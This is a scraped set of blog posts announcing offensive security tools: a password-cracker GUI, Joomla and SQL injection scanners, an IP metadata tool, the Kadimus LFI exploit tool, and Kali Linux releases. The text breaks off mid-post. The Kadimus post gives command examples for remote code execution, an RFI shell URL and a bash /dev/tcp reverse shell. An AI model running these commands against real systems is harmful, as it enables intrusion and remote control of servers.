    <article class="post hentry" id="4843460686930451358" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Johnny - GUI for John the Ripper  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-4843460686930451358" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://2.bp.blogspot.com/--S0h7En7v6A/VZ811Ek3E-I/AAAAAAAAEWw/qiDN_8CqxY4/s1600/johnny.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="382" src="http://2.bp.blogspot.com/--S0h7En7v6A/VZ811Ek3E-I/AAAAAAAAEWw/qiDN_8CqxY4/s640/johnny.png" width="640"></a>
      </div> 
      <br> Johnny is a cross-platform open-source 
      <abbr title="Graphical User Interface">GUI</abbr> for the popular password cracker John the Ripper.
      <br> 
      <a name="more"></a>
      <br> 
      <b><span style="font-size: large;">Features</span></b>
      <br> 
      <div class="level2"> 
       <ol> 
        <li class="level1">
         <div class="li">
           user could start, pause and resume attack (though only one session is allowed globally),
         </div> </li> 
        <li class="level2">
         <div class="li">
           all attack related options work,
         </div> </li> 
        <li class="level2">
         <div class="li">
           all input file formats are supported (pure hashes, pwdump, passwd, mixed),
         </div> </li> 
        <li class="level2">
         <div class="li">
           ability to resume any previously started session via session history,
         </div> </li> 
        <li class="level2">
         <div class="li">
           suggest the format of each hashes,
         </div> </li> 
        <li class="level2">
         <div class="li">
           try lucky guesses with password guessing feature,
         </div> </li> 
        <li class="level2">
         <div class="li">
           “smart” default options,
         </div> </li> 
        <li class="level2">
         <div class="li">
           accurate output of cracked passwords,
         </div> </li> 
        <li class="level2">
         <div class="li">
           config is stored in .conf file (~/.john/johnny.conf),
         </div> </li> 
        <li class="level2">
         <div class="li">
           nice error messages and other user friendly things,
         </div> </li> 
        <li class="level2">
         <div class="li">
           export of cracked passwords through clipboard,
         </div> </li> 
        <li class="level2">
         <div class="li">
           export works with office suits (tested with LibreOffice Calc),
         </div> </li> 
        <li class="level2">
         <div class="li">
           available in english and french,
         </div> </li> 
        <li class="level2">
         <div class="li">
           allows you to set environment variables for each session directly in Johnny
         </div> </li> 
       </ol> 
       <br> 
       <br> 
       <div style="text-align: center;"> 
        <b><span style="font-size: x-large;"><a href="http://openwall.info/wiki/john/johnny" target="_blank">Download &nbsp;Johnny</a></span></b>
       </div> 
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="8968670968108458488" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Joomlavs - A Black Box, Joomla Vulnerability Scanner  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-8968670968108458488" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://1.bp.blogspot.com/--I9Z95kOGbs/VluVbp9SRwI/AAAAAAAAE38/2Hi8j4M5tI0/s1600/joomla.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="251" src="http://1.bp.blogspot.com/--I9Z95kOGbs/VluVbp9SRwI/AAAAAAAAE38/2Hi8j4M5tI0/s400/joomla.png" width="400"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        JoomlaVS is a Ruby application that can help automate assessing how vulnerable a Joomla installation is to exploitation. It supports basic finger printing and can scan for vulnerabilities in components, modules and templates as well as vulnerabilities that exist within Joomla itself.
       <br> 
       <a name="more"></a>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <span style="font-size: large;"> <b> How to install </b> </span> 
      </div> 
      <div style="text-align: justify;">
        JoomlaVS has so far only been tested on Debian, but the installation process should be similar across most operating systems. 
      </div> 
      <ol> 
       <li> Ensure Ruby [2.0 or above] is installed on your system </li> 
       <li> Clone the source code using <code> git clone https://github.com/rastating/joomlavs.git </code> </li> 
       <li> Install bundler and required gems using <code> sudo gem install bundler &amp;&amp; bundle install </code> </li> 
      </ol> 
      <br> 
      <span style="font-size: large;"> <b> How to use </b> </span> 
      <br> The only required option is the 
      <code> -u </code> / 
      <code> --url </code> option, which specifies the address to target. To do a full scan, however, the 
      <code> --scan-all </code> option should also be specified, e.g. 
      <code> ruby joomlavs.rb -u yourjoomlatarget.com --scan-all </code> . 
      <br> A full list of options can be found below: 
      <br> 
      <pre><code>usage: joomlavs.rb [options]
Basic options
    -u, --url              The Joomla URL/domain to scan.
    --basic-auth           &lt;username:password&gt; The basic HTTP authentication credentials
    -v, --verbose          Enable verbose mode
Enumeration options
    -a, --scan-all         Scan for all vulnerable extensions
    -c, --scan-components  Scan for vulnerable components
    -m, --scan-modules     Scan for vulnerable modules
    -t, --scan-templates   Scan for vulnerable templates
    -q, --quiet            Scan using only passive methods
Advanced options
    --follow-redirection   Automatically follow redirections
    --no-colour            Disable colours in output
    --proxy                &lt;[protocol://]host:port&gt; HTTP, SOCKS4 SOCKS4A and SOCKS5 are supported. If no protocol is given, HTTP will be used
    --proxy-auth           &lt;username:password&gt; The proxy authentication credentials
    --threads              The number of threads to use when multi-threading requests
    --user-agent           The user agent string to send with all requests
</code></pre> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b> <span style="font-size: x-large;"> <a href="https://github.com/rastating/joomlavs" target="_blank"> Download Joomlavs </a> </span> </b> 
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="9048680960394935659" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> jSQL Injection v0.73 - Java Tool For Automatic SQL Database Injection.  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-9048680960394935659" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://3.bp.blogspot.com/-BVnAqlJK5cI/VoRjvbTxdZI/AAAAAAAAE9w/pg_btdICeLI/s1600/jsqlinjection.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="480" src="http://3.bp.blogspot.com/-BVnAqlJK5cI/VoRjvbTxdZI/AAAAAAAAE9w/pg_btdICeLI/s640/jsqlinjection.png" width="640"></a>
      </div> 
      <br> 
      <strong>jSQL Injection</strong> is a lightweight application used to find database information from a distant server.
      <br> 
      <br> jSQL is 
      <strong>free</strong>, 
      <strong>open source</strong> and 
      <strong>cross-platform</strong> (Windows, Linux, Mac OS X, Solaris).
      <br> 
      <br> jSQL is part of 
      <strong><a href="http://www.kali.org/">Kali Linux</a></strong>, the official new 
      <a href="http://www.backtrack-linux.org/">BackTrack</a> penetration distribution.
      <br> 
      <br> jSQL is also included in 
      <a href="http://www.blackhat-sec.com/">Black Hat Sec</a>, 
      <a href="https://archassault.org/">ArchAssault Project</a>, 
      <a href="http://www.blackarch.org/">BlackArch Linux</a> and 
      <a href="http://cyborg.ztrela.com/">Cyborg Hawk Linux</a>. 
      <br> 
      <a name="more"></a>
      <br> 
      <h2> Change log</h2> 
      <strong>Coming...</strong> 
      <code>i18n arabic russian chinese integration, next db engines: SQLite Access MSDE...</code>
      <br> 
      <strong>v0.73</strong> 
      <code>Authentication Basic Digest Negotiate NTLM and Kerberos, database type selection</code>
      <br> 
      <strong>v0.7</strong> 
      <code>Batch scan, Github issue reporter, support for 16 db engines, optimized GUI</code>
      <br> 
      <strong>alpha-v0.6</strong> 
      <code>Speed x 2 (no more hex encoding), 10 db vendors supported: MySQL Oracle SQLServer PostgreSQL DB2 Firebird Informix Ingres MaxDb Sybase. JUnit tests, log4j, i18n integration and more.</code>
      <br> 
      <strong>0.5</strong> 
      <code>SQL shell, Uploader.</code>
      <br> 
      <strong>0.4</strong> 
      <code>Admin page search, Brute force (md5 mysql...), Decoder (decode encode base64 hex md5...).</code>
      <br> 
      <strong>0.3</strong> 
      <code>Distant file reader, Webshell drop, Terminal for webshell commands, Configuration backup, Update checker.</code>
      <br> 
      <strong>0.2</strong> 
      <code>Time based algorithm, Multi-thread control (start pause resume stop), Shows URL calls.</code>
      <br> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span style="font-size: x-large;"><a href="https://github.com/ron190/jsql-injection" target="_blank">Download jSQL Injection v0.73</a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="5732586908616437225" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Just-Metadata - Tool that Gathers and Analyzes Metadata about IP Addresses  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-5732586908616437225" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://1.bp.blogspot.com/-7sPkHHJMLoQ/VYNuP6ZPEII/AAAAAAAAEP4/CAEr3vhkKlc/s1600/JustMetadata.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="270" src="http://1.bp.blogspot.com/-7sPkHHJMLoQ/VYNuP6ZPEII/AAAAAAAAEP4/CAEr3vhkKlc/s640/JustMetadata.png" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;">
        Just-Metadata is a tool that can be used to gather intelligence information passively about a large number of IP addresses, and attempt to extrapolate relationships that might not otherwise be seen. Just-Metadata has "gather" modules which are used to gather metadata about IPs loaded into the framework across multiple resources on the internet. Just-Metadata also has "analysis" modules. These are used to analyze the data loaded Just-Metadata and perform various operations that can identify potential relationships between the loaded systems.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        Just-Metadata will allow you to quickly find the Top "X" number of states, cities, timezones, etc. that the loaded IP addresses are located in. It will allow you to search for IP addresses by country. You can search all IPs to find which ones are used in callbacks as identified by VirusTotal. Want to see if any IPs loaded have been documented as taking part of attacks via the Animus Project, Just-Metadata can do it.
      </div> 
      <a name="more"></a>
      <br> 
      <div style="text-align: justify;">
        Additionally, it is easy to create new analysis modules to let people find other relationships between IPs loaded based on the available data. New intel gathering modules can be easily added in just as easily!
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;"> Setup</span></b>
      </div> 
      <div style="text-align: justify;"> 
       <br> Ideally, you should be able to run the setup script, and it will install everything you need.
      </div> 
      <div style="text-align: justify;">
        For the Shodan information gathering module, YOU WILL NEED a Shodan API key. This costs like $9 bucks, come on now, it's worth it :).
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;"> Usage</span></b>
      </div> 
      <div style="text-align: justify;"> 
       <br> As of now, Just metadata is designed to read in a single text file containing IPs, each on their own new line. Create this file from any source (C2 callback IPs, web server logs, etc.). Once you have this file, start Just-Metadata by calling it:
      </div> 
      <div style="text-align: justify;"> 
       <em>./Just-Metadata.py</em>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;"> Commands</span></b>
      </div> 
      <div style="text-align: justify;"> 
       <strong><br></strong> 
       <strong>help</strong> - Once in the framework, to see a listing of available commands and a description of what they do, type the "help" command.
       <br> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <strong>load &lt;filename&gt;</strong> - The load command takes an extra parameter, the file name that you (the user) want Just-Metadata to load IP addresses from. This command will open, and load all IPs within the file to the framework.
      </div> 
      <div style="text-align: justify;">
        Ex: load ipaddresses.txt
       <br> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <strong>save</strong> - The save command can be used to save the current working state of Just-Metadata. This is helpful in multiple cases, such as after gathering information about IPs, and wanting to save the state off to disk to be able to work on them at a later point in time. Simply typing "save" will result in Just-Metadata saving the state to disk, and displaying the filename of the saved state.
       <br> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <strong>import &lt;statefile&gt;</strong> - The import command can be used to load a previously saved Just-Metadata state into the framework. It will load all IPs that were saved, and all information gathered about the IP addresses. This command will require an extra parameter, the name of the state file that you want Just-Metadata to load.
      </div> 
      <div style="text-align: justify;">
        Ex: import goodfile.state
       <br> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <strong>list &lt;module type&gt;</strong> - The list command can be used to list the different types of modules loaded into Just-Metadata. This command will take an extra parameter, either "analysis" or "gather". Just-Metadata will display all mofules of the type that the user requests is listed.
      </div> 
      <div style="text-align: justify;">
        Ex: list analysis
      </div> 
      <div style="text-align: justify;">
        Ex: list gather
       <br> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <strong>gather &lt;gather module name&gt;</strong> - The gather command tells Just-Metadata to run the module specified and gather information from that source. This can be used to gather geographical information, Virustotal, whois, and more. It's all based on the module. The data gathered will be stored within the framework in memory and can also be saved to disk with the "save" command.
      </div> 
      <div style="text-align: justify;">
        Ex: gather geoinfo
      </div> 
      <div style="text-align: justify;">
        Ex: gather virustotal
       <br> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <strong>analyze &lt;analysis module name&gt;</strong> - The analyze command tells Metadata to run an analysis module against the data loaded into the framework. These modules can be used to find IP addresses that share the same SSH keys or SSL Public Key certificates, or certificate chains. They can also be used to find IP addresses used in the same callbacks by malicious executables.
       <br> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <strong>ip_info &lt;IP Address&gt;</strong> - This command is used to dump all information about a specific IP address. This is currently being used after having run analysis modules. For example, after identifying IP addresses that share the same SSH keys, I can dump all information about those IPs. I will see if they have been used by malware, where they are located, etc.
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;"> 
       <strong>export</strong> - The export command will have Just-Metadata dump all information that's been gathered about all IP addresses currently loaded into the framework to CSV.
       <br> 
       <br> Read more 
       <a href="https://www.christophertruncer.com/just-metadata-intel-gathering-and-analysis-of-ip-metadata/" target="_blank">here</a>.
       <br> 
       <br> 
       <div style="text-align: center;"> 
        <b><span style="font-size: x-large;"><a href="https://github.com/ChrisTruncer/Just-Metadata" target="_blank">Download&nbsp;Just-Metadata</a></span></b>
       </div> 
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="2095586760570658190" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Kadimus - LFI Scan &amp; Exploit Tool  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-2095586760570658190" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://2.bp.blogspot.com/-xDuLUIh27xM/VRiC8MWZxUI/AAAAAAAAD1g/RWn_fCh9Af0/s1600/LFI.PNG" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-xDuLUIh27xM/VRiC8MWZxUI/AAAAAAAAD1g/RWn_fCh9Af0/s1600/LFI.PNG"></a>
      </div> 
      <br> Kadimus is a tool to check sites to lfi vulnerability , and also exploit it
      <br> 
      <br> 
      <b><span class="Apple-style-span" style="font-size: large;">Features:</span></b>
      <br> 
      <ul> 
       <li> Check all url parameters</li> 
       <li> /var/log/auth.log RCE</li> 
       <li> /proc/self/environ RCE</li> 
       <li> php://input RCE</li> 
       <li> data://text RCE</li> 
       <li> Source code disclosure</li> 
       <li> Multi thread scanner</li> 
       <li> Command shell interface through HTTP Request</li> 
       <li> Proxy support (socks4://, socks4a://, socks5:// ,socks5h:// and http://)</li> 
      </ul> 
      <div> 
       <a name="more"></a>
       <br>
      </div> 
      <span class="Apple-style-span" style="font-size: large;"><b>Compile:</b></span>
      <br> 
      <br> 
      <b>Installing libcurl:</b>
      <br> 
      <ul> 
       <li>CentOS/Fedora</li> 
      </ul> 
      <div> 
       <pre><code># yum install libcurl-devel</code></pre> 
      </div> 
      <ul> 
       <li>Debian based</li> 
      </ul> 
      <div> 
       <pre><code># apt-get install libcurl4-openssl-dev</code></pre> 
      </div> 
      <br> 
      <br> 
      <b>Installing libpcre:</b>
      <br> 
      <br> 
      <ul> 
       <li>CentOS/Fedora</li> 
      </ul> 
      <div> 
       <pre><code># yum install libpcre-devel</code></pre> 
      </div> 
      <ul> 
       <li>Debian based</li> 
      </ul> 
      <div> 
       <pre><code># apt-get install libpcre3-dev</code></pre> 
      </div> 
      <br> 
      <br> 
      <b>Installing libssh:</b>
      <br> 
      <ul> 
       <li>CentOS/Fedora</li> 
      </ul> 
      <div> 
       <pre><code># yum install libssh-devel</code></pre> 
      </div> 
      <ul> 
       <li>Debian based</li> 
      </ul> 
      <div> 
       <pre><code># apt-get install libssh-dev</code></pre> 
      </div> 
      <br> 
      <b>And finally:</b>
      <br> 
      <div>
        $ git clone https://github.com/P0cL4bs/Kadimus.git
       <br> $ 
       <span class="pl-c1">cd</span> Kadimus
       <br> $ make
      </div> 
      <br> 
      <br> 
      <b><span class="Apple-style-span" style="font-size: large;">Options:</span></b>
      <br> 
      <pre><code>  -h, --help                    Display this help menu

  Request:
    -B, --cookie STRING         Set custom HTTP Cookie header
    -A, --user-agent STRING     User-Agent to send to server
    --connect-timeout SECONDS   Maximum time allowed for connection
    --retry-times NUMBER        number of times to retry if connection fails
    --proxy STRING              Proxy to connect, syntax: protocol://hostname:port

  Scanner:
    -u, --url STRING            Single URI to scan
    -U, --url-list FILE         File contains URIs to scan
    -o, --output FILE           File to save output results
    --threads NUMBER            Number of threads (2..1000)

  Explotation:
    -t, --target STRING         Vulnerable Target to exploit
    --injec-at STRING           Parameter name to inject exploit
                                (only need with RCE data and source disclosure)

  RCE:
    -X, --rce-technique=TECH    LFI to RCE technique to use
    -C, --code STRING           Custom PHP code to execute, with php brackets
    -c, --cmd STRING            Execute system command on vulnerable target system
    -s, --shell                 Simple command shell interface through HTTP Request

    -r, --reverse-shell         Try spawn a reverse shell connection.
    -l, --listen NUMBER         port to listen

    -b, --bind-shell            Try connect to a bind-shell
    -i, --connect-to STRING     Ip/Hostname to connect
    -p, --port NUMBER           Port number to connect

    --ssh-port NUMBER           Set the SSH Port to try inject command (Default: 22)
    --ssh-target STRING         Set the SSH Host

    RCE Available techniques

      environ                   Try run PHP Code using /proc/self/environ
      input                     Try run PHP Code using php://input
      auth                      Try run PHP Code using /var/log/auth.log
      data                      Try run PHP Code using data://text

    Source Disclosure:
      -G, --get-source          Try get the source files using filter://
      -f, --filename STRING     Set filename to grab source [REQUIRED]
      -O FILE                   Set output file (Default: stdout)
</code></pre> 
      <br> 
      <br> 
      <b><span class="Apple-style-span" style="font-size: large;">Examples:</span></b>
      <br> 
      <br> 
      <b>Scanning:</b>
      <br> 
      <pre><code>./kadimus -u localhost/?pg=contact -A my_user_agent
./kadimus -U url_list.txt --threads 10 --connect-timeout 10 --retry-times 0
</code></pre> 
      <br> 
      <b>Get source code of file:</b>
      <br> 
      <pre><code>./kadimus -t localhost/?pg=contact -G -f "index.php" -O local_output.php --inject-at pg
</code></pre> 
      <br> 
      <b>Execute php code:</b>
      <br> 
      <pre><code>./kadimus -t localhost/?pg=php://input -C '&lt;?php echo "pwned"; ?&gt;' -X input
</code></pre> 
      <br> 
      <b>Execute command:</b>
      <br> 
      <pre><code>./kadimus -t localhost/?pg=/var/log/auth.log -X auth -c 'ls -lah' --ssh-target localhost</code></pre> 
      <br> 
      <b>Checking for RFI:</b>
      <br> You can also check for RFI errors, just put the remote url on resource/common_files.txt and the regex to identify this, example:
      <br> 
      <div class="highlight highlight-php"> 
       <span class="pl-s1"><span class="pl-c">/* http://bad-url.com/shell.txt */</span></span> 
       <span class="pl-s1"><span class="pl-k">&lt;</span>?<span class="pl-c1">php</span> <span class="pl-c1">echo</span> <span class="pl-c1">base64_decode</span>(<span class="pl-s"><span class="pl-pds">"</span>c2NvcnBpb24gc2F5IGdldCBvdmVyIGhlcmU=<span class="pl-pds">"</span></span>); </span>
       <span class="pl-pse"><span class="pl-s1">?</span>&gt;</span> 
      </div> in file:
      <br> 
      <pre><code>http://bad-url.com/shell.txt?:scorpion say get over here</code></pre> 
      <br> 
      <b>Reverse shell:</b>
      <br> 
      <pre><code>./kadimus -t localhost/?pg=contact.php -Xdata --inject-at pg -r -l 12345 -c 'bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&gt;&amp;1' --retry-times 0</code></pre> 
      <br> 
      <br> 
      <div style="text-align: center;"> 
       <b><span class="Apple-style-span" style="font-size: x-large;"><a href="https://github.com/P0cL4bs/Kadimus/" target="_blank">Download Kadimus </a></span></b>
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="2014463946768327635" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Kali Linux 1.1.0 - The Best Penetration Testing Distribution  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-2014463946768327635" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://3.bp.blogspot.com/-IdqWs14iHaM/VNjz8GQJ8SI/AAAAAAAADq8/qeo1Moysx2Q/s1600/kali-1.1.0-released-v2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-IdqWs14iHaM/VNjz8GQJ8SI/AAAAAAAADq8/qeo1Moysx2Q/s1600/kali-1.1.0-released-v2.png" height="244" width="640"></a>
      </div> 
      <br> 
      <blockquote class="tr_bq" style="text-align: justify;">
        After almost two years of public development (and another year behind the scenes), we are proud to announce our first point release of 
       <a href="https://www.kali.org/news/kali-linux-1-1-0-released/" rel="dofollow" target="_blank" title="Kali Linux 1.1.0 Released"><strong>Kali Linux – version 1.1.0</strong></a>. This release brings with it a mix of unprecedented hardware support as well as rock solid stability. For us, this is a real milestone&nbsp;as this release&nbsp;epitomizes the benefits of our move from BackTrack to Kali Linux over two years ago. As we look at a now mature Kali, we see a versatile, flexible Linux distribution, rich with useful security and 
       <a href="https://www.kali.org/kali-linux-features/" rel="dofollow" target="_blank" title="Kali Linux Features">penetration testing related features</a>, running on all sorts of weird and wonderful 
       <a href="https://github.com/offensive-security/kali-arm-build-scripts" rel="nofollow" target="_blank" title="Kali Linux ARM hardware build scripts">ARM hardware</a>.&nbsp;But enough talk, here are the goods:
       <br> 
       <ul> 
        <li style="text-align: justify;">The new release runs a 3.18 kernel, patched for wireless injection attacks.</li> 
       </ul> 
       <ul> 
        <li style="text-align: justify;">Our ISO build systems are now running off live-build 4.x.</li> 
       </ul> 
       <ul> 
        <li style="text-align: justify;">Improved&nbsp;wireless driver support, due to both kernel and firmware upgrades.</li> 
       </ul> 
       <ul> 
        <li style="text-align: justify;">NVIDIA Optimus hardware support.</li> 
       </ul> 
       <ul> 
        <li style="text-align: justify;">Updated virtualbox-tool, openvm-tools and <a href="http://docs.kali.org/general-use/install-vmware-tools-kali-guest" rel="nofollow" target="_blank" title="Install vmware tools in Kali Linux">vmware-tools packages and instructions</a>.</li> 
       </ul> 
       <ul> 
        <li style="text-align: justify;">A whole bunch of fixes and updates from our bug-tracker <a href="https://bugs.kali.org/changelog_page.php" rel="nofollow" target="_blank" title="Kali Bug Tracker Changelog">changelog</a>.</li> 
       </ul> 
       <ul> 
        <li style="text-align: justify;">And most importantly, we changed grub screens and wallpapers!</li> 
       </ul> 
      </blockquote> 
      <a name="more"></a>
      <br> 
      <div style="text-align: justify;"> 
       <b><span style="font-size: large;">Upgrade Kali Linux 1.1.0</span></b>
      </div> 
      <div style="text-align: justify;"> 
       <br>
      </div> 
      <div style="text-align: justify;">
        If you’ve already got Kali Linux installed and running, there’s no need to re-download the image as you can simply update your existing operating system using simple 
       <strong>apt</strong> commands:
       <br> 
       <pre><code>apt-get update
apt-get dist-upgrade</code></pre> 
       <br> 
       <br> 
       <div style="text-align: center;"> 
        <b><span style="font-size: x-large;"><a href="https://www.kali.org/downloads/" target="_blank">Download&nbsp;Kali Linux 1.1.0</a></span></b>
       </div> 
      </div> 
     </div>
    </article> 
    <article class="post hentry" id="4690271323463771052" itemscope itemtype="http://schema.org/BlogPosting"> 
     <h1 class="post-title entry-title" itemprop="name headline"> Kali Linux 2.0 - The Best Penetration Testing Distribution  </h1> 
     <div class="post-header" style="position:absolute;left:-9999px"> 
      <div class="post-header-line-1"></div> 
     </div> 
     <div class="post-body entry-content" id="post-body-4690271323463771052" itemprop="articleBody"> 
      <div class="separator" style="clear: both; text-align: center;"> 
       <a href="http://1.bp.blogspot.com/-yEpoPn-_sCE/VcpuVngdkSI/AAAAAAAAEeY/9c4ShJMbd9g/s1600/kali-linux-2.0.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="332" src="http://1.bp.blogspot.com/-yEpoPn-_sCE/VcpuVngdkSI/AAAAAAAAEeY/9c4ShJMbd9g/s640/kali-linux-2.0.png" width="640"></a>
      </div> 
      <br> 
      <div style="text-align: justify;"> 
       <strong>So, what’s new in Kali 2.0?</strong> There’s a new 4.0 kernel, now based on Debian Jessie, improved hardware and wireless driver&nbsp;coverage, support for a variety of Desktop Environments (gnome, kde, xfce, mate, e17, lxde, i3wm), updated desktop environment and tools – and the list goes on.
       <br> 
       <a name="more"></a>
      </div> 
      <div> 
       <div> 
        <div> 
         <div> 
          <div style="text-align: justify;"> 
           <br>
          </div> 
          <div style="text-align: justify;"> 
           <b><span style="font-size: large;"> Kali Linux is Now a Rolling Distribution</span></b>
          </div> 
          <div style="text-align: justify;"> 
           <br>
          </div> 
         </div> 
        </div> 
        <div> 
         <div> 
          <div style="text-align: justify;">
            One of the biggest moves we’ve taken to keep Kali 2.0
           <strong> up-to-date&nbsp;in a global, continuous manner, </strong>is transforming Kali into a 
           <strong>rolling distribution.</strong> What this means is that we are pulling our packages continuously from&nbsp;
           <a class="external" href="https://www.debian.org/devel/testing" rel="nofollow" target="_blank">Debian Testing</a> (after&nbsp;making&nbsp;sure that all packages are&nbsp;installable) – essentially upgrading the Kali core system, while allowing us to take advantage of newer Debian packages as they roll out. This move is where our choice in Debian as a base system really pays off – we get to enjoy the stability of Debian, while still remaining 
           <em>on the cutting edge</em>.
          </div> 
         </div> 
        </div> 
        <div> 
        </div> 
       </div> 
      </div> 
      <div> 
      </div> 
      <div> 
       <div> 
        <div> 
         <div> 
          <div style="text-align: justify;"> 
           <br>
          </div> 
          <div style="text-align: justify;"> 
           <b><span style="font-size: large;"> Continuously Updated Tools, Enhanced Workflow</span></b>
          </div> 
          <div style="text-align: justify;"> 
           <br>
          </div> 
         </div> 
        </div> 
        <div> 
         <div> 
          <div style="text-align: justify;">
            Another interesting development in our infrastructure has been the integration of an 
           <strong>upstream version checking&nbsp;system</strong>, which alerts us when new upstream versions of tools are released (usually via git tagging). This script runs daily on a select list of common tools and keeps us alerted if a new tool requires updating. With this new system in place, 
           <strong>core tool updates will happen more frequently</strong>. With the introduction of this new monitoring system, we &nbsp;will slowly start phasing out the “tool upgrades” option in our 
           <a href="https://bugs.kali.org/" target="_blank">bug tracker</a>.
          </div> 
         </div> 
        </div> 
       </div> 
      </div> 
      <div> 
       <div> 
        <div> 
         <div> 
          <div style="text-align: justify;"> 
           <br>
          </div> 
          <div style="text-align: justify;"> 
           <b><span style="font-size: large;"> New Flavours of Kali Linux 2.0</span></b>
          </div> 
          <div style="text-align: justify;"> 
           <br>
          </div> 
         </div> 
        </div> 
        <div> 
         <div> 
          <div style="text-align: justify;">
            Through our Live Build process, Kali 2.0 now natively supports 
           <strong>KDE, GNOME3, Xfce, MATE, e17, lxde and i3wm</strong>. We’ve moved on to 
           <a class="external" href="https://www.gnome.org/gnome-3/" rel="nofollow" target="_blank">GNOME 3</a> in this release, marking the end of a long abstinence period. We’ve finally embraced GNOME 3 and with a few custom changes, it’s grown to be our favourite desktop environment. We’ve added custom support for multi-level menus, true terminal transparency, as well as a handful of useful gnome shell extensions. This however has come at a price – 
           <strong>the minimum RAM requirements for a full GNOME 3 session has increased to 768 MB</strong>. This is a non-issue on modern hardware but can be detrimental on lower-end machines. For this reason, we have also released an official, 
           <strong>minimal Kali 2.0 ISO</strong>. This “light” flavour of Kali includes a handful of useful tools together with the lightweight 
           <a class="external" href="http://www.xfce.org/" rel="nofollow" target="_blank">Xfce</a> desktop environment – a perfect solution for resource-constrained computers.
          </div> 
         </div> 
        </div> 
       </div> 
      </div> 
      <div> 
       <div> 
        <div> 
         <div> 
          <div style="text-align: justify;"> 
           <br>
          </div> 
          <div style="text-align: justify;"> 
           <b><span style="font-size: large;"> Kali Linux 2.0 ARM Images &amp;&nbsp;NetHunter 2.0</span></b>
          </div> 
          <div style="text-align: justify;"> 
           <br>
          </div> 
         </div> 
        </div> 
        <div> 
        </div> 
       </div> 
      </div> 
      <div> 
      </div> 
      <div> 
       <div> 
        <div> 
         <div> 
          <div style="text-align: justify;">
            The whole 
           <strong>ARM</strong> image section has been updated across the board with Kali 2.0 – including Raspberry Pi, Chromebooks, Odroids… The whole lot! In the process, we’ve added some new images – such as the latest 
           <strong>Chromebook Flip</strong> – the little beauty here on the right. Go ahead, click on the image, take a closer look. Another helpful change we’ve implemented in our ARM images is including kernel sources, for easier compilation of new drivers.
          </div> 
         </div> 
        </div> 
       </div> 
      </div> 
      <span style="text-align: justify;">We haven’t forgotten about </span>
      <strong style="text-align: justify;">NetHunter</strong>
      <span style="text-align: justify;">, our favourite mobile penetration testing platform – which also got an update and now&nbsp;includes Kali 2.0. With this, we’ve&nbsp;released a whole barrage of new NetHunter images for Nexus 5, 6, 7, 9, and 10. The </span>
      <strong style="text-align: justify;">OnePlus One</strong>
